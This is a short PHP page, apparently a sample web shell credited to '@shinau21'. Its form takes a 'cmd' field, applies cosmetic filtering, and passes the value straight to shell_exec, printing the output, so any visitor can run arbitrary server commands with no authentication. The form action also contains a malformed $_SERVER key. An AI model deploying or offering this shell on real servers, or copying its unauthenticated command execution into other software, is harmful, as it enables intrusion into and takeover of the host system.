<!DOCTYPE html>
<html>
 
<head>
</head>
 
<body>
    <?php
        // Defining variables
        $cmd = "";
 
        // Checking for a POST request
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
          $cmd = test_input($_POST["cmd"]);
        }
 
        // Removing the redundant HTML characters if any exist.
        function test_input($data) {
          $data = trim($data);
          $data = stripslashes($data);
          $data = htmlspecialchars($data);
          return $data;
        }
        ?>
 
        <h2>Sample PHP shell exec (@shinau21)</h2>
        <form method="post" action=
            "<?php echo htmlspecialchars($_SERVER[" PHP_SELF "]);?>">
            Name:
            <input type="text" name="cmd">
            <input type="submit" name="submit"
                   value="Submit">
        </form>
 
        <?php
        $output = shell_exec($cmd);
        echo "<pre>$output</pre>";
        ?>
</body>
 
</html>
